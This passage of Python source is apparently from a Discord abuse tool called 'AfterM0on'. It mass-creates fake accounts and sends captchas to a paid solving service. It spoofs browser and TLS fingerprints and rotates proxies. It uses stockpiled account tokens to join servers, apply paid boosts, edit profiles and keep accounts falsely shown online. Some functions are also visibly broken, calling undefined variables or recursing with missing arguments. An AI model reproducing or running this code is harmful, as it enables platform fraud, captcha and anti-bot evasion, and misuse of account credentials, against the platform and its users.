        cookie = f"locale=en; __dcfduid={response.cookies.get('__dcfduid')}; __sdcfduid={response.cookies.get('__sdcfduid')}; __cfruid={response.cookies.get('__cfruid')}"
        return cookie
    except Exception as e:
        get_cookies(x, useragent, thread)


def get_headers(token, thread):
    fp = random.choice(data)
    x = fp['x-super-properties']
    useragent = fp['useragent']
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': token,
        'content-type': 'application/json',
        'origin': 'https://discord.com',
        'referer':'https://discord.com',
        'sec-ch-ua': f'"Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="8"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'cookie': get_cookies(x, useragent, thread),
        'sec-fetch-site': 'same-origin',
        'user-agent': useragent,
        'x-context-properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6IjY3OTg3NTk0NjU5NzA1NjY4MyIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiIxMDM1ODkyMzI4ODg5NTk0MDM2IiwibG9jYXRpb25fY2hhbm5lbF90eXBlIjowfQ==',
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'en-US',
        'x-super-properties': x,
        'fingerprint': get_fingerprint(thread)
    }
    return headers, useragent

def get_headers_genex(token,  useragent, cookie, properties, fingerprint, thread):
    x = properties
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': token,
        'content-type': 'application/json',
        'origin': 'https://discord.com',
        'referer':'https://discord.com/channels/1055860533653418174/1109023137179381780',
        'sec-ch-ua': f'"Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="8"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'cookie': cookie,
        'sec-fetch-site': 'same-origin',
        'user-agent': useragent,
        'x-context-properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6IjY3OTg3NTk0NjU5NzA1NjY4MyIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiIxMDM1ODkyMzI4ODg5NTk0MDM2IiwibG9jYXRpb25fY2hhbm5lbF90eXBlIjowfQ==',
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'en-US',
        'x-super-properties': x,
        'fingerprint': fingerprint
    }
    return headers

def get_headers_gen(thread):
    fp = random.choice(data)
    x = fp['x-super-properties']
    useragent = fp['useragent']
    cookie = get_cookies(x, useragent, thread)
    fingerprint = get_fingerprint(thread)
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://discord.com',
        'referer':'https://discord.com/invite/WMJk6D38Xp',
        'sec-ch-ua': f'"Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="8"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'cookie': cookie,
        'sec-fetch-site': 'same-origin',
        'user-agent': useragent,
        'x-context-properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6IjY3OTg3NTk0NjU5NzA1NjY4MyIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiIxMDM1ODkyMzI4ODg5NTk0MDM2IiwibG9jYXRpb25fY2hhbm5lbF90eXBlIjowfQ==',
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'en-US',
        'x-super-properties': x,
        'fingerprint': fingerprint
    }
    return headers, useragent, cookie, x, fingerprint

def get_headers_genzdaz(useragent, cookie, properties, fingerprint, thread):
    x = properties
    solution = get_captcha_gen()
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://discord.com',
        'referer':'https://discord.com/invite/WMJk6D38Xp', 
        'sec-ch-ua': f'"Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="8"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'cookie': cookie,
        'sec-fetch-site': 'same-origin',
        'user-agent': useragent,
        'x-captcha-key': solution,
        'x-context-properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6IjY3OTg3NTk0NjU5NzA1NjY4MyIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiIxMDM1ODkyMzI4ODg5NTk0MDM2IiwibG9jYXRpb25fY2hhbm5lbF90eXBlIjowfQ==',
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'en-US',
        'x-super-properties': x,
        'fingerprint': fingerprint
    }
    return headers
    
    
def get_captcha_key(rqdata: str, site_key: str, websiteURL: str, useragent: str):

    task_payload = {
        'clientKey': config['capmonster_key'],
        'task': {
            "type"             :"HCaptchaTaskProxyless",
            "isInvisible"      : True,
            "data"             : rqdata,
            "websiteURL"       : websiteURL,
            "websiteKey"       : site_key,
            "userAgent"        : useragent
        }
    }
    key = None
    with httpx.Client(headers={'content-type': 'application/json', 'accept': 'application/json'},
                    timeout=30) as client:   
        task_id = client.post(f'https://api.capmonster.cloud/createTask', json=task_payload).json()['taskId']
        get_task_payload = {
            'clientKey': config['capmonster_key'],
            'taskId': task_id,
        }
        

        while key is None:
            response = client.post("https://api.capmonster.cloud/getTaskResult", json = get_task_payload).json()
            if response['status'] == "ready":
                key = response["solution"]["gRecaptchaResponse"]
            else:
                time.sleep(1)
            
    return key

def get_captcha_gen():
    task_payload = {
        'clientKey': config['capmonster_key'],
        'task': {
            "type"             :"HCaptchaTaskProxyless",
            "isInvisible"      : True,
            "websiteURL"       : websiteURL,
            "websiteKey"       : site_key,
            "userAgent"        : useragent
        }
    }
    key = None
    with httpx.Client(headers={'content-type': 'application/json', 'accept': 'application/json'},
                    timeout=30) as client:   
        task_id = client.post(f'https://api.capmonster.cloud/createTask', json=task_payload).json()['taskId']
        get_task_payload = {
            'clientKey': config['capmonster_key'],
            'taskId': task_id,
        }
        

        while key is None:
            response = client.post("https://api.capmonster.cloud/getTaskResult", json = get_task_payload).json()
            if response['status'] == "ready":
                key = response["solution"]["gRecaptchaResponse"]
            else:
                time.sleep(1)
            
    return key
    

def join_server(session, headers, useragent, invite, token, thread):
    join_outcome = False
    guild_id = 0
    try:
        for i in range(10):
            response = session.post(f'https://discord.com/api/v9/invites/{invite}', json={}, headers = headers)
            print(response.json())
            if response.status_code == 429:
                slprint(f"You're rate limit can you wait a moment?", f"{token}", False)
                f = open("config/logs/error/invalid/rate_limit.txt", "a")
                f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> You're rate limit can you wait a moment? | [Token : {token}]")
                f.close()
                time.sleep(15)
                join_server(session, headers, useragent, invite, token)
                
            elif response.status_code in [200, 204]:
                getusettesting = session.get(f"https://discord.com/api/v9/users/@me", headers={'Authorization': token})
                f = open("config/logs/captcha/join_without.txt", "a")
                f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> The token joined without captcha | [Token : {token}]")
                f.close()
                join_outcome = True
                guild_id = response.json()["guild"]["id"]
                break
            elif "captcha_rqdata" in response.text:
                slprint(f"A captcha has been detected", f"{token}", False)
                f = open("config/logs/captcha/detected.txt", "a")
                f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> A captcha has been detected | [Token : {token}]")
                f.close()
                r = response.json()
                solution = get_captcha_gen()
                slprint(f"Captcha solved", f"{token}", True)
                f = open("config/logs/captcha/resolved.txt", "a")
                f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> Captcha solved | [Token : {token}]")
                f.close()
                response = session.post(f'https://discord.com/api/v9/invites/{invite}', json={'captcha_key': solution,'captcha_rqtoken': r['captcha_rqtoken']}, headers = headers)
                if response.status_code in [200, 204]:
                    slprint(f"Managed to join despite having passed a captcha", f"{token}", True)
                    f = open("config/logs/captcha/joined_with.txt", "a")
                    f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> Managed to join despite having passed a captcha | [Token : {token}]")
                    f.close()
                    join_outcome = True
                    guild_id = response.json()["guild"]["id"]
                    break
                    
        return join_outcome, guild_id

            
    except Exception as e:
        join_server(session, headers, useragent, invite, token, thread)
        
        
def put_boost(session, headers, guild_id, boost_id, token):
    try:
        payload = {"user_premium_guild_subscription_slot_ids": [boost_id]}
        boosted = session.put(f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions", json=payload, headers=headers)
        if boosted.status_code == 201:
            return True
        elif 'Must wait for premium server subscription cooldown to expire' in boosted.text:
            slprint(f"Cooldown please wait.", f"{token}", False)
            f = open("config/logs/error/invalid/cooldown.txt", "a")
            f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> Cooldown please wait. | [Token : {token}]")
            f.close()
            return False
    except Exception as e:
        put_boost(session, headers, guild_id, boost_id, token)
    
    
def change_guild_name(session, headers, server_id, nick):
    try:
        jsonPayload = {"nick": nick}
        r = session.patch(f"https://discord.com/api/v9/guilds/{server_id}/members/@me", headers=headers, json=jsonPayload)
        if r.status_code == 200:
            return True
        else:
            return False
        
    except Exception as e:
        change_guild_name(session, headers, server_id, nick)

def change_guild_bio(session, headers, server_id, bio):
    try:
        jsonPayload = {"bio": bio}
        r = session.patch(f"https://discord.com/api/v9/guilds/{server_id}/members/@me", headers=headers, json=jsonPayload)
        if r.status_code == 200:
            slprint(f"The account biography has been changed :)", f"{token}", True)
            f = open("config/logs/succes/changer_bio.txt", "a")
            f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> The account biography has been changed | [Token : {token}]")
            f.close()
            return True
        else:
            return False
    except Exception as e:
        change_guild_bio(session, headers, server_id, bio)
def random_email(char_num):
    random_email = ''
    for x in range(char_num):
        random_email+=''.join(random.choice(string.ascii_lowercase))
    return random_email
def random_username():
    random_user = ''
    for x in range(9):
        random_user+=''.join(random.choice(string.ascii_lowercase))
    return random_user

def gen_unclaimed(thread):
    os.system(f"title AfterM0on - {dt.date.today().strftime('%D:%M:%Y')}")
    
    try:
        fp = random.choice(data)
        session = tls_client.Session(ja3_string = fp['ja3'], client_identifier = random.choice(client_identifiers))        
        if config['proxyless'] == True and len(open("config/proxies/proxies.txt", "r").readlines()) != 0:
            proxy = getproxy()
            session.proxies.update(proxy)

        headers, useragent, cookie, properties, fingerprint = get_headers_gen(thread)
        username = random_username()
        payload = {
            "captcha_key": None,
            "consent": True,
            "fingerprint": fingerprint,
            "gift_code_sku_id": None,
            "username": username,
            "invite": "WMJk6D38Xp"
        }
        sdfzegzef = session.post(f"https://discord.com/api/v9/auth/register", json=payload, headers=headers)
        if sdfzegzef.status_code == 400:
            payloaddeu = {
                "captcha_key": None,
                "consent": True,
                "fingerprint": fingerprint,
                "gift_code_sku_id": None,
                "username": username,
                "invite": "WMJk6D38Xp"
            }
            hed = get_headers_genzdaz(useragent, cookie, properties, fingerprint, thread)
            response = session.post(f"https://discord.com/api/v9/auth/register", json=payloaddeu, headers=hed)
            if response.status_code == 429:
                slprint(f"You're rate limit can you wait a moment ?", f"nop", False)
                zdazdazgazeazd = int(response.json()['retry_after'])
                time.sleep(zdazdazgazeazd)
            else:
                r = response.json()
                print(response.status_code)
                if response.status_code == 201:
                    token = r['token']
                    dfe = get_headers_genex(token,  useragent, cookie, properties, fingerprint, thread)
                    azfazgazedagf = session.get(f"https://discord.com/api/v9/users/@me", headers=dfe)
                    print(azfazgazedagf.json())
                    print(f"New token : {token} | Username : {azfazgazedagf.json()['username']}#{azfazgazedagf.json()['discriminator']}")
                    variables.boosts_done += 1
            
                if response.status_code == 429:
                    print(f"Ratelimited just wait retry ;) | Time : {r['retry_after']} ")
                    zdazdazgazeazd = int(r['retry_after'])
                    time.sleep(zdazdazgazeazd)
        else:
            print(f"Status code = {sdfzegzef.status_code}")
            variables.boosts_done += 1
    except Exception as e:
        print(f"Une erreur s'est produite : {str(e)}")

def gen_lock_mail(thread, invite):
    os.system(f"title AfterM0on - {dt.date.today().strftime('%D:%M:%Y')}")
    
    try:
        fp = random.choice(data)
        session = tls_client.Session(ja3_string = fp['ja3'], client_identifier = random.choice(client_identifiers))        
        if config['proxyless'] == True and len(open("config/proxies/proxies.txt", "r").readlines()) != 0:
            proxy = getproxy()
            session.proxies.update(proxy)
            print("Proxy has been set succefuly !")

        headers, useragent, cookie, properties, fingerprint = get_headers_gen(thread)
        username = random.choice(open('config/token/gen/user.txt', "r", encoding="utf-8").read().splitlines())
        email = f"Z{random_email(random.randrange(1,12))}G{random_email(1)}@gmail.com"
        password = f"{random_email(2)}Df#{random_email(3)}Z&{random_email(4)}"
        solution = get_captcha_gen()
        birthday = f"{random.randrange(1990,2001)}-{random.randrange(1,12)}-{random.randrange(1,25)}"
        payload = {
            "fingerprint":get_fingerprint(thread),
            "email":email,
            "username":username,
            "password":password,
            "invite":invite,
            "consent":True,
            "date_of_birth":f"{random.randrange(1990,2001)}-07-07",
            "gift_code_sku_id":None,
            "captcha_key":solution,
            "promotional_email_opt_in":True
        }
        response = session.post(f"https://discord.com/api/v9/auth/register", json=payload, headers=headers)
        if response.status_code == 429:
            slprint(f"You're rate limit can you wait a moment ?", f"nop", False)
            zdazdazgazeazd = int(response.json()['retry_after'])
            time.sleep(zdazdazgazeazd)
        else:
            r = response.json()
            print(r)
            if response.status_code == 201:
                token = r['token']
                print(f"New token : {token} | Username : {username} | Mail : {email} | Password : {password} | Birthday {birthday}")
                f = open("config/token/gen/gen_lock_mail.txt", "a")
                f.write(f"{token}:{email}:{password} | Birthday : {birthday} | Username : {username}\n")
                f.close()
                f = open("config/token/gen/token_only.txt", "a")
                f.write(f"{token}\n")
                f.close()
                f = open("config/token/gen/token_mail_mdp_only.txt", "a")
                f.write(f"{token}:{email}:{password}\n")
                f.close()
                variables.boosts_done += 1
        
            if response.status_code == 429:
                print(f"Ratelimited just wait retry ;) | Time : {r['retry_after']} ")
                zdazdazgazeazd = int(r['retry_after'])
                time.sleep(zdazdazgazeazd)
    except Exception as e:
        print(f"Une erreur s'est produite : {str(e)}")

def check_token(token):
    os.system(f"title AfterM0on - {dt.date.today().strftime('%D:%M:%Y')}")
    
    try:
        fp = random.choice(data)
        session = tls_client.Session(ja3_string = fp['ja3'], client_identifier = random.choice(client_identifiers))        
        if config['proxyless'] == True and len(open("config/proxies/proxies.txt", "r").readlines()) != 0:
            proxy = getproxy()
            session.proxies.update(proxy)

        azfazgazedagf = session.get(f"https://discord.com/api/v9/users/@me", headers={'Authorization': token})
        print(azfazgazedagf.json())
        variables.boosts_done += 1
    except Exception as e:
        print(f"Une erreur s'est produite : {str(e)}")

def joinerd_server(invite:str , token:str, thread:int):
    os.system(f"title AfterM0on - {dt.date.today().strftime('%D:%M:%Y')}")
    
    try:
        fp = random.choice(data)
        session = tls_client.Session(ja3_string = fp['ja3'], client_identifier = random.choice(client_identifiers))        
        if config['proxyless'] == True and len(open("config/proxies/proxies.txt", "r").readlines()) != 0:
            proxy = getproxy()
            session.proxies.update(proxy)

        headers, useragent = get_headers(token, thread)
        getuserbos = session.get(f"https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers)

        if "401: Unauthorized" in getuserbos.text:
            slprint(f"Unauthorized for use this token", f"{token}", False)
            f = open("config/logs/error/invalid.txt", "a")
            f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> Unauthorized for use this token | [Token : {token}]")
            f.close()
            variables.failed_tokens.append(token)
            
        if "You need to verify your account in order to perform this action." in getuserbos.text:
            slprint(f"Token locked verify this token for use that", f"{token}", False)
            f = open("config/logs/error/locked.txt", "a")
            f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> Token locked verify this token for use that | [Token : {token}]")
            f.close()
            variables.failed_tokens.append(token)
            
        join_outcome, guild_id = join_server(session, headers, useragent, invite, token, thread)
        if join_outcome:
            slprint(f"Successfully joined the discord", f"{token}", True)
            f = open("config/logs/succes/join_guild.txt", "a")
            f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> Successfully joined the discord | [Token : {token}]")
            f.close()
            variables.boosts_done += 1
            
                                        
    except Exception as e:
        joinerd_server(invite, token, thread)
    
def boost_server(invite:str , months:int, token:str, thread:int, nick: str, bio: str):
    os.system(f"title AfterM0on - {dt.date.today().strftime('%D:%M:%Y')}")

    if months == 1:
        filename = "config/token/1Months.txt"
    elif months == 2:
        filename = "config/token/2Months.txt"
    elif months == 3:
        filename = "config/token/3Months.txt"
    
    try:
        fp = random.choice(data)
        session = tls_client.Session(ja3_string = fp['ja3'], client_identifier = random.choice(client_identifiers))

        if config['proxyless'] == True and len(open("config/proxies/proxies.txt", "r").readlines()) != 0:
            proxy = getproxy()
            session.proxies.update(proxy)

        headers, useragent = get_headers(token, thread)
        boost_data = session.get(f"https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers)
        if "401: Unauthorized" in boost_data.text:
            slprint(f"Unauthorized for use this token", f"{token}", False)
            f = open("config/logs/error/invalid.txt", "a")
            f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> Unauthorized for use this token | [Token : {token}]")
            f.close()
            variables.failed_tokens.append(token)
            remove(token, filename)
            
        if "You need to verify your account in order to perform this action." in boost_data.text:
            slprint(f"Token locked verify this token for use that", f"{token}", False)
            f = open("config/logs/error/locked.txt", "a")
            f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> Token locked verify this token for use that | [Token : {token}]")
            f.close()
            variables.failed_tokens.append(token)
            remove(token, filename)
            
        if boost_data.status_code == 200:
            if len(boost_data.json()) != 0:
                join_outcome, guild_id = join_server(session, headers, useragent, invite, token, thread)
                if join_outcome:
                    f = open("config/logs/succes/join_guild.txt", "a")
                    f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> Successfully joined the discord | [Token : {token}]")
                    f.close()
                    for boost in boost_data.json():
                        boost_id = boost["id"]
                        boosted = put_boost(session, headers, guild_id, boost_id, token)
                        if boosted:
                            slprint(f"The token has successfully boosted", f"{token}", True)
                            f = open("config/logs/succes/boosted.txt", "a")
                            f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> The token has successfully boosted | [Token : {token}]")
                            f.close()
                            variables.boosts_done += 1
                            if token not in variables.success_tokens:
                                variables.success_tokens.append(token)
                        else:
                            slprint(f"Impossible to boost with those token", f"{token}", False)
                            f = open("config/logs/error/boosted.txt", "a")
                            f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> Impossible to boost with those token | [Token : {token}]")
                            f.close()
                            if token not in variables.failed_tokens:
                                variables.failed_tokens.append(token)
                    remove(token, filename)
                    if nick:
                        changed_name = change_guild_name(session, headers, guild_id, nick)
                        if changed_name:
                            f = open("config/logs/succes/renaming.txt", "a")
                            f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> Missions succeed, are nickname is well modified | [Token : {token}]")
                            f.close()
                        else:
                            f = open("config/logs/error/renaming.txt", "a")
                            f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> It is impossible to rename the account on those discord | [Token : {token}]")
                            f.close()
                    if bio:
                        changed_bio = change_guild_bio(session, headers, guild_id, bio)
                        if changed_bio:
                            f = open("config/logs/succes/changer_bio.txt", "a")
                            f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> The account biography has been changed | [Token : {token}]")
                            f.close()
                        else:
                            f = open("config/logs/succes/changer_bio.txt", "a")
                            f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> The account biography has been changed | [Token : {token}]")
                            f.close()
                else:
                    slprint(f"Can't join those discord so can't boosts", f"{token}", False)
                    f = open("config/logs/error/join.txt", "a")
                    f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> Can't join those discord so can't boosts | [Token : {token}]")
                    f.close()
                    variables.failed_tokens.append(token)
            else:
                remove(token, filename)
                slprint(f"An error has just arrived, so find the suspect he does not have nitro", f"{token}", False)
                f = open("config/logs/error/no_nitro.txt", "a")
                f.write(f"\n[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> An error has just arrived, so find the suspect he does not have nitro | [Token : {token}]")
                f.close()
                variables.failed_tokens.append(token)
                                        
    except Exception as e:
        boost_server(invite, months, token, thread, nick, bio)


def thread_boost(invite, amount, months, nick, bio):
    variables.boosts_done = 0
    variables.success_tokens = []
    variables.failed_tokens = []

    if validateInvite(invite) == False:
        cls()
        sprint(f"The invite received is invalid.", False)
        asker()
        return False

    if amount % 2 != 0:
        cls()
        sprint("The number of boosts must be even", False)
        asker()
        return False

    if months == 1:
        filename = f"config/token/1Months.txt"
    elif months == 2:
        filename = f"config/token/2Months.txt"
    elif months == 3:
        filename = f"config/token/3Months.txt"
    else:
        cls()
        sprint(f"Invalid months value. It should be 1 or 3.", False)
        asker()
        return False
    
        
    while variables.boosts_done != amount:
        print()
        tokens = get_all_tokens(filename)
        
        if variables.boosts_done % 2 != 0:
            variables.boosts_done -= 1
            
        numTokens = int((amount - variables.boosts_done)/2)
        if len(tokens) == 0 or len(tokens) < numTokens:
            cls()
            sprint(f"Not enough {months} month(s) tokens stock left to complete request", False)
            asker()
            return False
        
        else:
            threads = []
            for i in range(numTokens):
                token = tokens[i]
                thread = i+1
                sprint(f"Launch in progress.[{thread*2}/{numTokens*2}]", False)
                t = threading.Thread(target=boost_server, args=(invite, months, token, thread, nick, bio))
                t.daemon = True
                threads.append(t)
                
            for i in range(numTokens):
                threads[i].start()
            print()
                
            for i in range(numTokens):
                threads[i].join()

    return True

def thread_joining(invite, amount):
    variables.boosts_done = 0
    variables.success_tokens = []
    variables.failed_tokens = []
    filename = f"config/token/token_joiner.txt"

    if validateInvite(invite) == False:
        cls()
        sprint(f"The invite received is invalid.", False)
        asker()
        return False
        
    while variables.boosts_done != amount:
        tokens = get_all_tokens(filename)
            
        numTokens = int((amount - variables.boosts_done))
        if len(tokens) == 0 or len(tokens) < numTokens:
            cls()
            sprint(f"Not enough tokens stock left to complete request", False)
            asker()
            return False
        
        else:
            threads = []
            for i in range(numTokens):
                token = tokens[i]
                thread = i+1
                sprint(f"Launch in progress.[{thread}/{numTokens}]", False)
                t = threading.Thread(target=joinerd_server, args=(invite, token, thread))
                t.daemon = True
                threads.append(t)
                
            for i in range(numTokens):
                threads[i].start()
            print()
                
            for i in range(numTokens):
                threads[i].join()

    return True

def thread_unclz(amount):
    variables.boosts_done = 0
    variables.success_tokens = []
    variables.failed_tokens = []
        
    while variables.boosts_done != amount:            
        numTokens = int((amount - variables.boosts_done))
        threads = []
        for i in range(numTokens):
            thread = i+1
            sprint(f"Launch in progress.[{thread}/{numTokens}]", False)
            dazgazd = int(thread)
            t = threading.Thread(target=gen_unclaimed, args=(dazgazd,))
            t.daemon = True
            threads.append(t)
                
        for i in range(numTokens):
            threads[i].start()
        print()
                
        for i in range(numTokens):
            threads[i].join()

    return True

def thread_lockmail(amount, invite):
    variables.boosts_done = 0
    variables.success_tokens = []
    variables.failed_tokens = []
        
    while variables.boosts_done != amount:            
        numTokens = int((amount - variables.boosts_done))
        threads = []
        for i in range(numTokens):
            thread = i+1
            sprint(f"Launch in progress.[{thread}/{numTokens}]", False)
            dazgazd = int(thread)
            t = threading.Thread(target=gen_lock_mail, args=(dazgazd, invite,))
            t.daemon = True
            threads.append(t)
                
        for i in range(numTokens):
            threads[i].start()
        print()
                
        for i in range(numTokens):
            threads[i].join()

    return True

def thread_check(amount, token):
    variables.boosts_done = 0
    variables.success_tokens = []
    variables.failed_tokens = []
        
    while variables.boosts_done != amount:            
        numTokens = int((amount - variables.boosts_done))
        threads = []
        for i in range(numTokens):
            thread = i+1
            sprint(f"Launch in progress.[{thread}/{numTokens}]", False)
            t = threading.Thread(target=check_token, args=(token,))
            t.daemon = True
            threads.append(t)
                
        for i in range(numTokens):
            threads[i].start()
        print()
                
        for i in range(numTokens):
            threads[i].join()

    return True

def asker():
    cls()
    if config['streamer_mode'] == True:
        ascii_react = f"""
                _     __ _            __  __  ___              
               / \   / _| |_ ___ _ __|  \/  |/ _ \  ___  _ __  
              / _ \ | |_| __/ _ \ '__| |\/| | | | |/ _ \| '_ \ 
             / ___ \|  _| ||  __/ |  | |  | | |_| | (_) | | | |
            /_/   \_\_|  \__\___|_|  |_|  |_|\___/ \___/|_| |_|
                        Support : discord.gg/WMJk6D38Xp                  
         > License                 : {config['license_key'][:9]} - Streamer Mode
         > Stockage(3Months)       : {len(open('config/token/3Months.txt', 'r').read().splitlines()) * 2}
         > Stockage(2Months)       : {len(open('config/token/2Months.txt', 'r').read().splitlines()) * 2}
         > Stockage(1Months)       : {len(open('config/token/1Months.txt', 'r').read().splitlines()) * 2}
         > Stockage(Token Joiner)  : {len(open('config/token/token_joiner.txt', 'r').read().splitlines())}
         > Stockage(Token Onliner) : {len(open('config/token/tokens_onliner.txt', 'r').read().splitlines())}
        """
    else:
        ascii_react = f"""
          _____ ___  ____  _______  __  __  __    _    ____  _  _______ _____ 
         |  ___/ _ \|  _ \| ____\ \/ / |  \/  |  / \  |  _ \| |/ / ____|_   _|
         | |_ | | | | |_) |  _|  \  /  | |\/| | / _ \ | |_) | ' /|  _|   | |  
         |  _|| |_| |  _ <| |___ /  \  | |  | |/ ___ \|  _ <| . \| |___  | |  
         |_|   \___/|_| \_\_____/_/\_\ |_|  |_/_/   \_\_| \_\_|\_\_____| |_|  
                        Support : discord.gg/WMJk6D38Xp                  
         > License                 : {config['license_key']}
         > Stockage(3Months)       : {len(open('config/token/3Months.txt', 'r').read().splitlines()) * 2}
         > Stockage(2Months)       : {len(open('config/token/2Months.txt', 'r').read().splitlines()) * 2}
         > Stockage(1Months)       : {len(open('config/token/1Months.txt', 'r').read().splitlines()) * 2}
         > Stockage(Token Joiner)  : {len(open('config/token/token_joiner.txt', 'r').read().splitlines())}
         > Stockage(Token Onliner) : {len(open('config/token/tokens_onliner.txt', 'r').read().splitlines())}
        """

    print(Colorate.Vertical(Colors.blue_to_white, Center.XCenter(ascii_react)))

    whatis_append = sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on | Token Online  | true - false ]> ", str, "Online")
    zdaza_aazedaf = sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on | Token Checker | true - false ]> ", str, "checker")
    sdfozp_append = sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on | Token Joiner  | true - false ]> ", str, "sniperD")
    zdqsdposd_zad = sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on | Token Booster | true - false ]> ", str, "tknbo")
    azdfzad_zazfa = sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on | Token Gen unc | true - false ]> ", str, "gen")
    gzdfzad_zazfa = sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on | Token Gen mai | true - false ]> ", str, "gen")

    if whatis_append == "true":
        init(True, True)

        class Onliner():
            def __init__(self, token,i):
                self.token = token 
                self.i = i
                self.connect_to_ws(token)

            def get_random_presence(self):
                status = random.choice(["online","dnd","idle"])
                return {"game": "discord.gg/AfterM0on","status":status,"since":0,"activites":[],"afk":False}
            
            def connect_to_ws(self, token):
                from websocket import WebSocketApp
                def on_message(ws:WebSocketApp,msg):
                    msg = json.loads(msg)
                    if msg["op"] == 10:
                        payload = {
                            "op":2,
                            "d":{
                                "token":token,
                                "properties":{"os":"Windows","browser":"Chrome","device":"","system_locale":"en-US","os_version":"10"},
                                "presence":self.get_random_presence(),
                                "compress": False,
                            }
                        }
                        ws.send(json.dumps(payload))
                        print("Onlined",token+f" {Fore.RESET}|{Fore.BLUE} {self.i}")
                WebSocketApp("wss://gateway.discord.gg/?encoding=json&v=9",on_message=on_message).run_forever()
        if __name__ == "__main__":
            for i,token in enumerate(open("config/token/token_joiner.txt", "r+").read().splitlines()):
                threading.Thread(target=Onliner,args=(token,i)).start()
    elif zdaza_aazedaf == "true":
        token_a = sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on | Token check]> ", str, "Cherrck")

        go = time.time()
        thread_check(1, token_a)
        end = time.time()
        time_went = round(end - go, 2)

        print()
        sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on]> Click on the enter button to start a new server.", str, "Press")
        cls()
        asker()
    elif azdfzad_zazfa == "true":
        amount_a = sinput(f"[{dt.date.today()} - {datetime.now().strftime('%H:%M:%S')} | AfterM0on | Amount for creation account ]> ", int, "Quantity")

        go = time.time()
        thread_unclz(amount_a)
        end = time.time()
